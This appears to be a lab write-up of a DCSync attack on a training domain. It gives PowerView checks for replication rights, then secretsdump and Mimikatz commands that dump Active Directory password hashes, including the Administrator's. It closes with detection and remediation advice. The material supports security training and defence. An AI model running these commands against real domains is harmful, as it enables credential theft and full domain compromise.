#### **Objective:**

Leverage **DCSync** privileges on the `adunn` account to extract **Active Directory password hashes** for full domain compromise.


DCSync is an attack technique that abuses the **Directory Replication Service Remote Protocol (DRSR)** to **mimic a Domain Controller (DC)** and request **password hashes** for all users in the domain.

**Prerequisites:**

- **Replicating Directory Changes** and **Replicating Directory Changes All** permissions.
- Domain/Enterprise Admins have this right by default, but **misconfigured accounts** (like `adunn`) may also have it.

---

### 1. Checking DCSync Privileges**

#### **Confirming `adunn`'s Membership & Privileges**

Using **PowerView** to check **group membership**:
```powershell
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl
```

Verifying **DCSync privileges**:
```powershell
$sid = Convert-NameToSid "adunn" 
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```

If the output includes **DS-Replication-Get-Changes-All**, then the user can execute a **DCSync attack**.

### **3. Extracting Hashes Using DCSync**

#### **Method 1: Using `secretsdump.py` (Linux)**
```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```
Extracts **NTLM password hashes** and **Kerberos keys** from `ntds.dit`.

**Filtering Options:**
- `-just-dc-ntlm` → Extract only NTLM hashes.
- `-just-dc-user <USERNAME>` → Extract a single user’s hash.
- `-pwd-last-set` → View last password change time.
- `-history` → Dump password history.

### **4. Extracting Hashes Using Mimikatz (Windows)**

**Step 1: Run PowerShell as `adunn`**
```powershell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```
Step 2: Launch Mimikatz
```powershell
.\mimikatz.exe
privilege::debug
```
Perform **DCSync attack**:
```powershell
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

### Implications & Next Steps

**Full Domain Compromise:**  
With the **NTLM hash** of the **Administrator** account, an attacker can:

- **Pass-the-Hash (PtH) attack** to gain immediate admin access.
- **Golden Ticket attack** for **permanent** backdoor access.
- **Kerberos Silver Ticket attacks** to bypass authentication.

**Remediation Recommendations:**

1. **Monitor AD for `Event ID 4662` and `Event ID 5136`** to detect unauthorized replication requests.
2. **Restrict Replication Permissions** to **only** Domain Controllers.
3. **Enable Advanced Auditing** to track replication requests.
4. **Monitor and rotate privileged account passwords** regularly.
5. **Deploy Windows Defender Credential Guard** to block credential dumping.
